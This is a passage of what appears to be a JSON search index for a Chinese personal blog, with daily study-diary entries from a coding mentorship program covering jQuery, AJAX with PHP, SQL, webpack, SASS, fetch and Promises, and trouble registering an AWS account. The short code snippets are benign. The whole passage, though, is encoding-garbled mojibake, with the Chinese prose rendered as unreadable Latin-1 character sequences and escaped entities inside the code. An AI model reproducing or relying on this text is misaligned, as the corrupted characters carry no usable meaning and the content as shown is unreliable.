…æŒä¸‹å»ï¼Œæ¯å¤©éƒ½è¦æ¯”æ˜¨å¤©çš„è‡ªå·±é‚„è¦å¼·ï¼Œæ˜¯æˆ‘å°è‡ªå·±çš„æœŸè¨±ã€‚ è¨±é¡˜æ± æ˜å¤©å¸Œæœ›èƒ½æŠŠ todo list å®Œæˆï¼Œé †åˆ©çš„è©±èªªä¸å®šèƒ½è¶•å¿«é€²åˆ°ä¸‹ä¸€é€±çš„é€²åº¦ã€‚","link":"/2022/02/25/mentor-program-day73/"},{"title":"mentor-program-day74","text":"åˆåˆ°äº†å¿«æ¨‚çš„é€£å‡ï¼Œä¸éé‚„æ˜¯è¦å¥½å¥½åˆ©ç”¨æ™‚é–“ã€‚ é€²åº¦ä»Šå¤©ç¨å¾®èŠ±äº†é»æ™‚é–“åš jQuery çš„ç­†è¨˜ï¼š jQuery çš„ emptyã€remove å’Œ detach çš„å·®åˆ¥ jQuery éš¨ç­†è¨˜ æ„Ÿè¦ºåˆæ›´èªè­˜ jQuery äº†ä¸€é»ï¼ æ¥è‘—å»¶çºŒæ˜¨å¤©çš„ todo-listï¼ŒæŠŠè©²åšçš„åŠŸèƒ½åŠ ä¸Šå»ï¼š é¡¯ç¤ºæ‰€æœ‰ todo é¡¯ç¤ºæœªå®Œæˆ todo é¡¯ç¤ºå·²å®Œæˆ todo æŠŠ todo å„²å­˜æˆè³‡æ–™ æ¥è‘—åªè¦è·Ÿå¾Œç«¯ä¸²èµ·ä¾†å°±å·®ä¸å¤šäº†ï¼ŒåŠ æ²¹ï¼ å­¸åˆ°çš„äº‹æƒ…æˆ‘è¦ºå¾— jQuery é™¤äº†å¯«èµ·ä¾†å¾ˆç°¡æ½”ä»¥å¤–ï¼Œé‚„æœ‰ä¸€å€‹å¾ˆæ£’çš„åœ°æ–¹æ˜¯ä½œè€…è¨­è¨ˆäº†è »å¤šç¬¦åˆäººæ€§çš„ methodsã€‚åƒæ˜¯ remove empty å’Œ detachï¼Œæˆ‘åŸæœ¬ä»¥ç‚ºå®ƒå€‘å°±åªæœ‰åˆªé™¤å…ƒç´ çš„ä½œç”¨è€Œå·²ã€‚å¯æ˜¯åœ¨çœ‹é é€™ç¯‡æ–‡ç«  ä¹‹å¾Œæ‰ç™¼ç¾åŸä¾†å®ƒå€‘éƒ½æœ‰é¡ä¼¼ cache çš„æ©Ÿåˆ¶å­˜åœ¨ã€‚ cache æ˜¯ä¸€å€‹å¾ˆå¥½çš„æ©Ÿåˆ¶ï¼Œåˆ©ç”¨å®ƒèƒ½å¤ å¯¦ç¾ã€Œåªæƒ³ä¿®æ”¹ä¸€éƒ¨åˆ†å…§å®¹ã€çš„éœ€æ±‚ã€‚æ‰€ä»¥æˆ‘åœ¨å¼„æ‡‚é€™äº›å¾Œå°±å›å»æŠŠç·¨è¼¯ todo çš„ç¨‹å¼ç¢¼çµ¦é‡æ§‹äº†ã€‚åŸæœ¬çš„æ€è·¯æ˜¯ç”¨ CSS å…ˆæŠŠ A è—èµ·ä¾†ï¼ŒB ç§€å‡ºä¾†ï¼Œç¾åœ¨è®Šæˆæ˜¯ç”¨ jQuery æŠŠ A ç§»é™¤å¾Œ cache èµ·ä¾†ï¼ŒæŠŠ B ç§€å‡ºä¾†ï¼Œå¤§æ¦‚æ˜¯é€™æ¨£çš„å·®ç•°å§ã€‚ é›–ç„¶å¾æ•ˆèƒ½ä¸Šä¾†èªª CSS çš„åšæ³•æ‡‰è©²æ¯”è¼ƒå¥½ï¼ˆå¥½åƒæ˜¯å› ç‚ºç€è¦½å™¨ä¸æœƒã€Œé‡ç¹ªã€çš„é—œä¿‚ï¼‰ï¼Œä¸éåˆ©ç”¨ cache çš„ä½œæ³•æˆ‘è¦ºå¾—è »æœ‰è¶£çš„ï¼Œæ‰€ä»¥å°±åˆ»æ„ç”¨é€™å€‹æ–¹æ³•ä¾†å®Œæˆã€‚ é¡Œå¤–è©±å¦‚æœæœ‰æ™‚é–“çš„è©±ï¼Œå¸Œæœ›èƒ½å»å¤–é¢é‚Šé¨è»Šé‚Šçœ‹é¢¨æ™¯ã€‚çœ‹é¢¨æ™¯èƒ½å¤ æŠŠç”Ÿæ´»ä¸­çš„é›œäº‹çµ¦æš«æ™‚æ‹‹é–‹ï¼Œæ‰€ä»¥æˆ‘å–œæ­¡çœ‹é¢¨æ™¯ï¼Œå–œæ­¡é€™ç¨®å¹³å¹³éœéœçš„æ™‚å…‰ã€‚ è¨±é¡˜æ± åˆ°äº†å‡æ—¥å°±æ˜¯æˆ‘é€²åº¦è®Šæ…¢çš„æ™‚å€™ï¼Œä¸éé‚„æ˜¯å¸Œæœ›æ˜å¤©èƒ½é †åˆ©æŠŠ todo list å®Œæˆã€‚","link":"/2022/02/26/mentor-program-day74/"},{"title":"mentor-program-day75","text":"ç¡å¥½ç¡æ»¿çš„ä¸€å¤©ã€‚ é€²åº¦ä»Šå¤©æŠŠ todo list çš„æœ€å¾Œä¸€å¡Šæ‹¼åœ–å®Œæˆï¼ˆå¾Œç«¯å­˜å–è³‡æ–™ï¼‰ï¼š åšå®Œå¾Œçªç„¶æ„Ÿåˆ°æ€ æƒ°ï¼Œå°±è·‘å» Lidemy çœ‹äº†å…¶ä»–çš„å·¥å…·å½±ç‰‡ï¼ˆwebpackã€SASS by åŠ©æ•™ï¼‰ã€‚ webpack çœŸçš„æ˜¯ç¾ä»£å‰ç«¯é–‹ç™¼ä¸å¯æˆ–ç¼ºçš„ç¥å™¨ä¹‹ä¸€ï¼Œä¸éä¹Ÿç¢ºå¯¦åƒ huli èªªçš„ï¼Œconfig æ˜¯æ¯”è¼ƒéº»ç…©çš„ä¸€é»ï¼Œå¸Œæœ›ä¹‹å¾Œèƒ½æ…¢æ…¢ç¿’æ…£è·ŸæŒæ¡ webpack çš„çŸ¥è­˜ã€‚ SASS çš„éƒ¨åˆ†åŠ©æ•™è¬›çš„è©³ç´°å¥½æ‡‚ï¼Œä¹Ÿå­¸åˆ°å¾ˆå¤šæˆ‘ä»¥å‰æ‡¶å¾—å»å­¸çš„ function å’Œ if for é€™äº›æ±è¥¿ï¼Œå› ç‚ºé€™äº›é€²éšèªæ³•å°æ–¼å°å°ˆæ¡ˆä¾†èªªå¯¦åœ¨æ®ºé›ç„‰ç”¨ç‰›åˆ€ï¼Œæ„Ÿå—ä¸åˆ°å®ƒå€‘çš„å¥½ç”¨ä¹‹è™•ã€‚ä¸éä»Šå¤©åœ¨ä¸Šå®ŒåŠ©æ•™çš„èª²å¾Œç®—æ˜¯çµ¦æˆ‘æ‰“äº†ä¸€é–€è »å¥½çš„åŸºç¤ï¼Œä¹‹å¾Œè¦ä¾†èŠ±æ™‚é–“åšé»ç­†è¨˜äº†ã€‚ å­¸åˆ°çš„äº‹æƒ…åœ¨ç”¨ AJAX å‚³è³‡æ–™åˆ°å¾Œç«¯æ™‚ç¨å¾®å¡äº†ä¸€ä¸‹ï¼Œå› ç‚ºå¹³å¸¸éƒ½æ˜¯ç”¨è¡¨å–®çš„æ–¹å¼ä¾†å¸¶è³‡æ–™ï¼Œä¾‹å¦‚èªªï¼š 12345678910111213141516171819// å–å¾—è¡¨å–®å…ƒç´ const form = $('form');// è¨­å®šç›£è½å™¨form.bind('submit', (e) =&gt; { // åœæ­¢é è¨­è¡Œç‚º e.preventDefault(); // ç™¼å‡º request $.ajax({ url: 'http://localhost/peanu/todo-list/api_save_todo.php', type: 'POST', // é æœŸå›å‚³çš„è³‡æ–™æ ¼å¼ dataType: 'json', // è¦å‚³éå»çš„è³‡æ–™æ ¼å¼ï¼ˆè¡¨å–®ï¼‰ contentType: 'application/x-www-form-urlencoded; charset=UTF-8', // serialize() å–å¾—è¡¨å–®çš„æ¬„ä½å€¼ data: $('form').serialize(), success: (response) =&gt; console.log(response) })}) æ¥è‘—å¾Œç«¯å°±èƒ½ç”¨ $_POST æ‹¿åˆ°è³‡æ–™ã€‚ ä½†ç¾åœ¨è³‡æ–™æ ¼å¼è®Š JSON å¾Œå°±ä¸èƒ½é€™æ¨£ç”¨ï¼Œå¾—ç”¨ file_get_contents('php://input') æ‰è¡Œï¼Œé€™ä¸€é»é‚„è »ä¸ä¸€æ¨£çš„ã€‚ å¦å¤–åœ¨åš json_encode æ™‚ä¹Ÿç¨å¾®æœ‰é»æ··äº‚ã€‚ä¸€é–‹å§‹ä»¥ç‚ºå¾Œç«¯è¦æŠŠè³‡æ–™æ”¾åˆ°è³‡æ–™åº«å‰è¦åœ¨ encode ä¸€æ¬¡ï¼Œä½†å…¶å¯¦ä¸ç”¨ï¼Œå› ç‚ºå‰ç«¯é€ä¾†çš„è³‡æ–™å°±å·²ç¶“ encode éäº†ï¼Œé€™æ¨£å­æ˜¯å¤šæ­¤ä¸€èˆ‰ï¼Œæäº†å ´çƒé¾ã€‚ æ¥è‘—ï¼Œå¾Œç«¯æœ€å¾Œè¦çµ¦å‰ç«¯ todo çš„å°æ‡‰ idï¼ŒåŸæœ¬æƒ³èªªè¦æ€éº¼æ¨£æ‰èƒ½ã€Œå¾è³‡æ–™åº«å–å‡ºæœ€æ–°ä¸€ç­†è³‡æ–™ã€ï¼Œä¸Šç¶²æŸ¥äº†ä¸€ä¸‹ç™¼ç¾å¯ä»¥ç”¨ MAX() ä¾†å–å‡ºæœ€æ¬„ä½çš„æœ€å¤§å€¼ï¼Œæ‰€ä»¥æˆ‘ç”¨äº†é€™å€‹æ–¹æ³•ï¼š 1SELECT MAX(id) AS id FROM todos; ä½†å¾Œä¾†ç™¼ç¾æˆ‘é‚„è »å‚»çš„ï¼Œæ€éº¼ä¸ç”¨ï¼š 1SELECT * FROM todos ORDER BY id DESC LIMIT 1; çœŸæ˜¯å¤ªè ¢å•¦ï¼ä¸éä¹Ÿå› æ­¤èªè­˜äº†ä¸€å€‹æ–°çš„è§£æ³•ï¼Œæ‡‰è©²ä¹Ÿä¸ç®—åƒè™§å•¦ã€‚ é¡Œå¤–è©±å¸Œæœ›èƒ½è·Ÿå¥³å‹æ°¸é åœ¨ä¸€èµ·ï¼Œé€™æ‰æ˜¯æˆ‘æœ€æƒ³çæƒœçš„ä¸€åˆ‡ã€‚ è¨±é¡˜æ± æ˜å¤©è¦æŠŠ week12 å®Œæˆï¼Œå¸Œæœ›å•¦ï½","link":"/2022/02/27/mentor-program-day75/"},{"title":"mentor-program-day76","text":"æœ€å¾Œä¸€å¤©çš„å‡æ—¥ã€‚ é€²åº¦ä»Šå¤©æŠŠ week12 çš„ä½œæ¥­å®Œæˆè·Ÿæª¢è¨ï¼Œçµ‚æ–¼åˆè¦é€²åˆ° week13 äº†ã€‚ æª¢è¨ä½œæ¥­çš„æ™‚å€™çœ‹äº†è »å¤šåŒå­¸çš„ä½œæ¥­ï¼Œä¸é code çš„éƒ¨åˆ†åªæœ‰ç¨å¾®çœ‹éï¼Œå¯èƒ½æ˜¯æœ‰é»æ‡¶äº†å§ã€‚ åœ¨æª¢è¨ä½œæ¥­å®Œå¾Œï¼Œåˆå›å»çœ‹äº† [MTR01] çš„ä¸€äº›å…§å®¹ã€‚å› ç‚º week13 çš„ hw2 æˆ‘æ²’æœ‰å¾ˆæ‡‚è¦åšä»€éº¼ï¼ˆå› ç‚ºæ²’æœ‰ç›¸é—œè³‡æºï¼‰ï¼Œæ‰€ä»¥æƒ³èªªèƒ½ä¸èƒ½å¾ MTR01 è£¡é¢æ‰¾å‡ºäº›ç·šç´¢ã€‚é›–ç„¶çœ‹èµ·ä¾†å¸Œæœ›ä¸å¤§ï¼Œä¸éæ²’é—œä¿‚ï¼Œæˆ‘ç›¸ä¿¡æœ€å¾Œé‚„æ˜¯èƒ½æ‰¾åˆ°è§£æ±ºè¾¦æ³•çš„ã€‚ å­¸åˆ°çš„äº‹æƒ…ä»Šå¤©å¥½åƒæ²’ä»€éº¼èƒ½ç‰¹åˆ¥ç´€éŒ„çš„äº‹æƒ…ï¼Œä¸»è¦å°±æ˜¯æª¢è¨è·Ÿçœ‹å½±ç‰‡ã€‚ ä¸éåœ¨çœ‹ [MTR01] æ™‚å­¸åˆ°äº† Transaction èˆ‡ Lock çš„è§€å¿µï¼Œæˆ‘è¦ºå¾—é€™å…©å€‹æ±è¥¿é‚„è »æœ‰è¶£çš„ï¼Œå› ç‚ºèƒŒå¾Œè¦è§£æ±ºçš„å•é¡Œæ˜¯æ—¥å¸¸ä¸­å¾ˆç†Ÿæ‚‰çš„äº‹ï¼Œä¾‹å¦‚èªªæ¶ç¥¨ã€æ¶å•†å“é€™äº›ã€‚ ç¸½ä¹‹ï¼Œé›–ç„¶é‚„æ²’æœ‰å¯¦ä½œéï¼Œä¸éæˆ‘æ‡‰è©²æœƒæ‰¾å€‹æ™‚é–“ä¾†è©¦è©¦çœ‹å§ã€‚ é¡Œå¤–è©±é‚„æ˜¯è€æ¨£å­ï¼Œé›–ç„¶æœ‰æ™‚å€™æœƒè¿·å¤±æ–¹å‘ï¼Œä½†é‚„æ˜¯è¦åŠªåŠ›å …æŒä¸‹å»ã€‚ è¨±é¡˜æ± æ˜å¤©å¯èƒ½æœƒç¹¼çºŒçœ‹ [MTR01]ï¼Œä¹Ÿæˆ–è¨±æœƒé–‹å§‹åš week13 çš„ä½œæ¥­ï¼Œç¸½ä¹‹åŠ æ²¹å§ï¼","link":"/2022/02/28/mentor-program-day76/"},{"title":"mentor-program-day77","text":"åˆç¡å¤ªæ™šå•¦ï¼Œé€²åº¦å°‘çš„å¯æ† QQ é€²åº¦ä»Šå¤©ç¹¼çºŒçœ‹ [FE201]ï¼Œå­¸ç¿’å…¶ä»–å·¥å…·çš„ä½¿ç”¨ã€‚ å­¸åˆ°çš„äº‹æƒ…ä»Šå¤©å°±ä¸èŠ±å¤ªå¤šæ™‚é–“æ‰“äº†ï¼Œå¾—è¶•å¿«å»è£œé€²åº¦ã€‚ é›–ç„¶åœ¨éå»æœ‰ç”¨é gulpã€babel å’Œ webpackï¼Œä½†æ„Ÿè¦ºé‚„æ˜¯ä¸å¤ æ¸…æ¥šå®ƒå€‘è©²æ€éº¼ç”¨æ¯”è¼ƒå¥½ã€‚å¸Œæœ›é€™å¹¾å¤©çœ‹å®Œå½±ç‰‡ä¸¦å¯¦ä½œå¾Œå¯ä»¥å¼„æ¸…æ¥šä¸€äº›ã€‚ é¡Œå¤–è©±gulp æ„Ÿè¦ºå°±æ˜¯æ‡¶äººæƒ³å‡ºä¾†çš„æ±è¥¿ï¼ŒçœŸå²å®³ã€‚ è¨±é¡˜æ± æ˜å¤©æœƒç¹¼çºŒçœ‹ [FE201]ï¼Œé‚Šå¯¦ä½œé‚Šä½œç­†è¨˜ã€‚","link":"/2022/03/01/mentor-program-day77/"},{"title":"mentor-program-day78","text":"æ™‚é–“ä¸€å¤©ä¸€å¤©åœ°éï¼Œè‡ªå·±ä¹Ÿä¸€å¤©ä¸€å¤©çš„æˆé•·ã€‚åŸä¾†å·²ç¶“é€²å…¥ä¸‰æœˆä»½äº†ã€‚ é€²åº¦ä»Šå¤©æŠŠ [FE201] çµ¦çœ‹å®Œäº†ï¼Œå°æ–¼è©²å­¸çš„å·¥å…·ä¹Ÿéƒ½ç¨å¾®åœ°ç·´ç¿’éäº†ï¼š babel ä¹‹å†æ¬¡è¤‡ç¿’ gulp çš„ä½¿ç”¨æ–¹æ³• èªè­˜ webpack webpack é–‹ç™¼æ™‚çš„ä¸€äº›è¨­å®š é›–ç„¶åªæ˜¯å·¥å…·ï¼Œä½†æ˜¯å°ç¾ä»£å‰ç«¯é–‹ç™¼ä¾†èªªå»æ˜¯ä¸å¯æˆ–ç¼ºçš„æ±è¥¿ã€‚ å­¸åˆ°çš„äº‹æƒ…åœ¨å­¸äº† webpack å¾Œæˆ‘æ‰çœŸçš„æ˜ç™½ä»€éº¼å«åšã€Œæ¨¡çµ„åŒ–é–‹ç™¼ã€ã€‚å³ä¾¿ä»¥å‰ç”¨ Vue æ™‚å°±å·²ç¶“ç”¨éimport exportï¼Œä½†è€å¯¦èªªåªçŸ¥é“æ€éº¼ç”¨å’ŒçŸ¥é“èƒŒå¾Œçš„å«æ„æ˜¯ä¸å¤ªä¸€æ¨£çš„ã€‚åœ¨çœŸçš„çŸ¥é“ä»¥å¾Œæ‰æœƒç†è§£ã€Œå“¦ï¼ŒåŸä¾†æ˜¯å› ç‚ºæœ‰ webpack æ‰èƒ½åšé€™äº›äº‹ã€ï¼Œä¸ç„¶ä¸€ç›´éƒ½ä»¥ç‚ºæ˜¯å–®ç´”çš„ ES Moduleã€‚ ç¾åœ¨çœ‹åˆ°ä¸€å † export default æˆ– import ä¸å†é‚£éº¼é™Œç”Ÿäº†ï¼Œå…¶å¯¦èƒŒå¾Œè¦åšçš„äº‹æƒ…å¾ˆç°¡å–®ï¼Œä¸éå°±æ˜¯æŠŠä¸€åº§åŸå ¡æ‹†æˆä¸€å€‹å€‹çš„å°æ¨‚é«˜è€Œå·²ã€‚ é¡Œå¤–è©±çœ‹äº†ä¸çŸ¥é“å¹¾åéçš„æ–‡ç« ï¼šé›¶åŸºç¤çš„å°æ˜è¦å¦‚ä½•æˆç‚ºå‰ç«¯å·¥ç¨‹å¸«ï¼Ÿï¼Œé€™ä¹‹é–“å¤§æ¦‚ç¶“éäº†ä¸‰ã€å››å¹´ï¼Œç›´åˆ°ç¾åœ¨æˆ‘æ‰çœŸçš„å¾é ­åˆ°å°¾ææ¸…æ¥šè£¡é¢åœ¨èªªä»€éº¼ã€‚ä¸çŸ¥é“é€™æ˜¯ä¸æ˜¯ä»£è¡¨æˆ‘å·²ç¶“æˆé•·äº†å¾ˆå¤šå‘¢ï¼Ÿ ç¸½ä¹‹ï¼Œé€™ç¯‡æ–‡ç« å°æˆ‘ä¾†èªªé‚„è »ç‰¹åˆ¥çš„ï¼Œæ¯ä¸€æ¬¡çœ‹éƒ½æœƒæœ‰ä¸åŒçš„æ„Ÿå—ã€‚å¸Œæœ›æˆ‘èƒ½ç¹¼çºŒæˆé•·ä¸‹å»ï¼Œå¯¦ç¾å¿ƒä¸­çš„ç›®æ¨™ã€‚ è¨±é¡˜æ± æ˜å¤©æ‡‰è©²å°±æœƒé–‹å§‹åšä½œæ¥­äº†ï¼ŒåŠ æ²¹ï½","link":"/2022/03/02/mentor-program-day78/"},{"title":"mentor-program-day79","text":"yo åœé›»äº†ã€‚ é€²åº¦ä»Šå¤©æŠŠå¯«äº†ç¬¬ä¸€å€‹ä½œæ¥­ï¼ŒæŠŠ week6 çš„è¡¨å–®è·Ÿé¤å»³ç¶²é ç”¨ SCSS ä¾†æ”¹å¯«ï¼Œå¦å¤–ä¹Ÿçœ‹äº†èª²ç¶±æä¾›çš„ fetch èˆ‡ Promise è£œå……æ•™æï¼Œé‚„å·®ä¸€äº›å°±çœ‹å®Œäº†ã€‚ å­¸åˆ°çš„äº‹æƒ…ä»¥å‰ä¸€ç›´ä¸å¤ªæ‡‚ Promise è·Ÿ fetch çš„å¯¦éš›ç”¨æ³•ï¼Œéƒ½æ˜¯çœ‹åˆ¥äººæ€éº¼ç”¨å°±è·Ÿè‘—ç”¨é€™æ¨£å­ã€‚ä»Šå¤©èƒ½æŠŠé€™å€‹å‘çµ¦å¡«å®Œé‚„ä¸éŒ¯ï¼Œå¸Œæœ›ä¹‹å¾Œèƒ½æŒæ¡é€™å€‹æŠ€è¡“ï¼Œæˆç‚ºéåŒæ­¥å¤§å¸«ã€‚ é¡Œå¤–è©±æœ€è¿‘æœƒåˆ©ç”¨é–’æš‡æ™‚é–“å…ˆå·çœ‹ React çš„å…§å®¹ï¼Œæ„Ÿè¦º React çš„æ€ç¶­çœŸçš„è·ŸåŸæœ¬å·®å¾ˆå¤šï¼Œæœ‰äº›æ±è¥¿ä¼¼æ‡‚éæ‡‚çš„ï¼Œå¸Œæœ›ä¹‹å¾Œèƒ½ç¿’æ…£ QQ è¨±é¡˜æ± ä¾†å€‹ä¹…é•çš„æ¢åˆ—å¼ï¼š æŠŠ fetch Promise çœ‹å®Œè·Ÿåšç­†è¨˜ åšç¬¬äºŒå€‹ä½œæ¥­ã€‚ åŠ æ²¹ï½","link":"/2022/03/03/mentor-program-day79/"},{"title":"mentor-program-day80","text":"ç¬¬ 80 å¤©ï½ é€²åº¦ä»Šå¤©æŠŠ fetch è·Ÿ Promise çµ¦å­¸å®Œäº†ï¼Œä¹Ÿåšäº†ç­†è¨˜ï¼š å¾ fetch ä¾†èªè­˜ Promise fetch è™•ç†éŒ¯èª¤çš„æ–¹å¼ fetch ç™¼ post çš„æ–¹å¼ fetch çš„æ³¨æ„äº‹é … ç”¨ Promise ä¾†åŒ…è£ XMLHttpRequest è‡ªå·±æä¸€å€‹ Promise Promise æœ€å¤§çš„ç”¨é€”ï¼Ÿ async await èƒŒå¾Œçš„åŸç† Promise æœ€å¤§çš„ç”¨é€”ï¼Ÿ ä¹Ÿå› ç‚ºå…¨å°å¤§åœé›»çš„é—œä¿‚ï¼ŒæŠŠä»¥å‰è²·çš„æ›¸æ‹¿èµ·ä¾†ç¿»ï¼Œå­¸åˆ°äº†ä¸€äº›è »æœ‰è¶£çš„å°çŸ¥è­˜ï¼šä½ ä¸çŸ¥é“çš„ console å°æŠ€å·§ æœ€å¾Œåˆ°äº†æ™šä¸Šå¥½ä¸å®¹æ˜“å¾©é›»ï¼Œæ‰é–‹å§‹åšä½œæ¥­äºŒã€‚ç›®å‰åªåšåˆ°ä¸€åŠï¼Œæ˜å¤©ç¹¼çºŒåŠ æ²¹ï½ å­¸åˆ°çš„äº‹æƒ…ä»Šå¤©å› ç‚ºåœé›»çš„é—œä¿‚ï¼Œåˆ©ç”¨æ™‚é–“è·Ÿå¥³æœ‹å‹åˆ©å‡ºå»æ•£æ•£å¿ƒã€‚æœç„¶å…©å€‹äººä¸€èµ·å‡ºé–€æ˜¯æœ€é–‹å¿ƒçš„äº‹æƒ…ã€‚ åœ¨åšä½œæ¥­äºŒæ™‚é–‹å§‹æ”¹ç”¨ arrow function èˆ‡ components çš„æ€ç¶­ä¾†å¯« codeï¼Œæƒ³å…ˆç‚ºä»¥å¾Œçš„ React é‹ªè·¯ã€‚ æ„Ÿè¦ºè‡ªå·±ä¹Ÿæ…¢æ…¢è¸ä¸Šæ›´é«˜çš„é ˜åŸŸï¼Œå¯« code çš„æ–¹å¼ä¹Ÿæ…¢æ…¢å¾—è·ŸåŸæœ¬ä¸åŒã€‚é€™æ˜¯è »æœ‰è¶£çš„ç¾è±¡ï¼Œåœ¨ä»¥å‰ç¸½æœƒè¦ºå¾—ç‚ºä»€éº¼ä¸€å€‹ç°¡å–®çš„ function è¦åˆ»æ„å¯«æˆé€™æ¨£ï¼š 1234const getFancy = (aLowGuy) =&gt; { addSomeFancy(aLowGuy); return aLowGuy} åŸæœ¬çš„ç¿’æ…£æ˜¯é€™æ¨£ï¼š 1234function getFancy () { addSomeFancy(aLowGuy); return aLowGuy} ä¹Ÿä¸çŸ¥é“æ€éº¼èªªï¼Ÿæœ‰æ™‚å€™ä¸çŸ¥ä¸è¦ºå°±ã€Œé€™æ¨£å¯«å¥½åƒä¹Ÿè »ä¸éŒ¯ã€çš„æ„Ÿè¦ºã€‚ ç¸½ä¹‹æœ€é‡è¦çš„é‚„æ˜¯è‡ªå·±èƒ½æ¥å—å°±å¥½ï¼Œå¸Œæœ›å¯« code æŠ€å·§è¶Šä¾†è¶Šå²å®³ï½ é¡Œå¤–è©±åœé›»æ‡‰è©²æ˜¯ä¸€ç¨®å¼·è¿«äººé¡å›æ­¸å¤§è‡ªç„¶çš„æ–¹æ³•ã€‚ä¸éå¶çˆ¾é«”é©—é€™ç¨®å¾ˆã€ŒåŸå§‹ã€çš„ç”Ÿæ´»ä¹Ÿåˆ¥æœ‰ä¸€ç•ªé¢¨å‘³ã€‚ è¨±é¡˜æ± å¸Œæœ›æ˜å¤©å¯ä»¥æŠŠä½œæ¥­å®Œæˆï¼Œç„¶å¾Œå°±èƒ½é€²åˆ°æœ€åˆºæ¿€çš„ç¶²ç«™éƒ¨ç½²äº†ï¼","link":"/2022/03/04/mentor-program-day80/"},{"title":"mentor-program-day81","text":"è¶Šä¾†è¶Šæ¥è¿‘å°¾è²ã€‚ é€²åº¦ä»Šå¤©æŠŠ week13 çš„ä½œæ¥­éƒ½å®Œæˆäº†ã€‚ æ•´é«”ä¾†èªªé‚„è »é †åˆ©çš„ï¼Œæ¯”èµ· callback hellï¼Œasync / await çœŸçš„æ˜¯ä¸€å¤§ç¦éŸ³ã€‚ å¦å¤–ï¼Œé›–ç„¶åœ¨æª¢è¨æ™‚æœ‰å˜—è©¦å¾åŒå­¸çš„ä½œæ¥­è£¡çœ‹çœ‹èƒ½ä¸èƒ½çŒœå‡º webpack æ’ä»¶æ€éº¼å¯«ï¼Œä¸éé‚„æ˜¯æ²’è§£å‡ºä¾†ï¼Œæœ‰é»å°å¯æƒœï½ å­¸åˆ°çš„äº‹æƒ…åœ¨é‡åš twitch çš„ä½œæ¥­å¾Œï¼Œæ„Ÿè¦ºå° fetch Promise å’Œ async / await æœ‰äº†æ›´æ·±çš„ç†è§£ï¼ŒçœŸä¸éŒ¯ã€‚ä¹Ÿæœ‰çœ‹åˆ°æŸå€‹åŒå­¸å–„ç”¨ã€Œæ¨¡çµ„æ©Ÿåˆ¶ã€ä¾†å®Œæˆé€™ä»½ä½œæ¥­ï¼Œå¾ˆåƒæˆ‘ä»¥å‰åœ¨å¯« Vue æ™‚çš„é‚£ç¨®å½¢ç‹€ï¼Œä¸éæˆ‘é‚„ä¸å¤ªç†Ÿè¦æ€éº¼é‚£æ¨£å¯«ï¼Œå¸Œæœ›ä¹‹å¾Œèƒ½æ¼¸æ¼¸æŒæ¡é€™ç¨®æŠ€å·§ã€‚ é›–ç„¶ä½œæ¥­åšå®Œäº†ï¼Œä¸éç™¼ç¾ week13 é‚„æœ‰ä¸€äº›è§€å¿µæ²’è£œé½Šï¼Œå°±æ˜¯ Sprite èˆ‡ Data URIã€‚é—œæ–¼ Sprite æˆ‘ä»¥å‰æœ‰åœ¨æ›¸ä¸Šçœ‹éï¼Œç•¶æ™‚è¦ºå¾—é€™æ˜¯è »ç¥å¥‡çš„æŠ€å·§ï¼Œä½†åˆè¦ºå¾—æœ‰é»éº»ç…©ï¼Œæ‰€ä»¥å¯¦å‹™ä¸Šé‚„è »å°‘ç”¨åˆ°çš„ã€‚åˆ°äº†ç¾åœ¨æ‰ç†è§£åŸä¾†å®ƒæ˜¯ä¸€å€‹ç¯€çœè³‡æºçš„æŠ€è¡“ï¼Œçœ‹ä¾†é‚„æ˜¯ä¹–ä¹–å­¸èµ·ä¾†æ¯”è¼ƒå¥½ï¼ é¡Œå¤–è©±é‚„è »é–‹å¿ƒçš„ï¼Œæ„Ÿè¦ºè‡ªå·±å¿«èµ°å®Œé€™ä»½è¨ˆç•«äº†ï¼Œç¹¼çºŒåŠ æ²¹åŠ æ²¹ï¼ è¨±é¡˜æ± å¸Œæœ›æ˜å¤©æŠŠ week13 æœ€å¾Œçš„ä¸€å¡Šæ‹¼åœ–å®Œæˆï¼Œæ¥è‘—å°±çœŸçš„è¦ä¾†éƒ¨ç½²äº†ã€‚","link":"/2022/03/05/mentor-program-day81/"},{"title":"mentor-program-day82","text":"å‰›èµ·æ­¥å°±è¸¢åˆ°éµæ¿ã€‚ é€²åº¦ä»Šå¤©æŠŠ week13 å‰©é¤˜çš„ CSS çŸ¥è­˜çµ¦è£œé½Šï¼š CSS åˆ©ç”¨ Sprite ä¾†æå‡æ•ˆèƒ½ CSS åˆ©ç”¨ Signature ä¾†è®“å°è¦½åˆ—æ›´å¥½å¯« CSS åˆ©ç”¨ DataURI ä¾†ç¯€çœæµé‡ æœ¬ä¾†åœ¨åšå®Œå¾Œå°±è¦å»éƒ¨å±¬ç¶²ç«™äº†ï¼Œæ²’æƒ³åˆ°æ‰å‰›è¦è¨»å†Š AWS å¸³è™Ÿï¼Œå°±è¢«é›»è©±é©—è­‰çµ¦å¡ä½ï¼š ä¹Ÿè¨±æ˜¯å› ç‚ºä¸€é–‹å§‹æˆ‘éƒ½æ”¶ä¸åˆ°é©—è­‰ç¢¼ï¼Œé‡æ–°è©¦äº†å¤ªå¤šæ¬¡å°±è¢« ban äº† QQ ç„¡å¥ˆä¹‹ä¸‹ä¹‹å¥½å¯«ä¿¡çµ¦ AWS å•å•çœ‹ï¼š å¸Œæœ›èƒ½ç›¡å¿«è§£æ±ºé€™å€‹å•é¡Œ QQ å­¸åˆ°çš„äº‹æƒ…æ—¢ç„¶æ²’è¾¦æ³•éƒ¨ç½²ï¼Œå°±åªå¥½ç¹¼çºŒè·‘é€²åº¦ã€‚æ‰€ä»¥æ¥ä¸‹ä¾†æˆ‘å°±å»çœ‹ [FE201] çš„èª²ç¨‹ã€‚ ä¸å¾—ä¸ä½©æœ Huli ã€Œæ•´ç†é‡é»ã€çš„èƒ½åŠ›ï¼Œå¾ˆå¤šæ ¸å¿ƒé‡é»åœ¨èª²ç¨‹è£¡éƒ½èªªå¾—ä¸€æ¸…äºŒæ¥šã€‚æŸç¨®ç¨‹åº¦ä¸Šä¾†èªªé€™é–€èª²æ˜¯æˆ‘è¦ºå¾— JS ç³»åˆ—è£¡æœ€æœ‰è¶£çš„ä¸€å ‚ï¼Œå› ç‚º JS å¾ˆå¤šè«åå…¶å¦™çš„è¡Œç‚ºåœ¨é€™å ‚èª²è£¡éƒ½æœ‰è§£ç­”ï¼Œå°¤å…¶æ˜¯ hoisting å’Œ closure çš„éƒ¨åˆ†ã€‚ 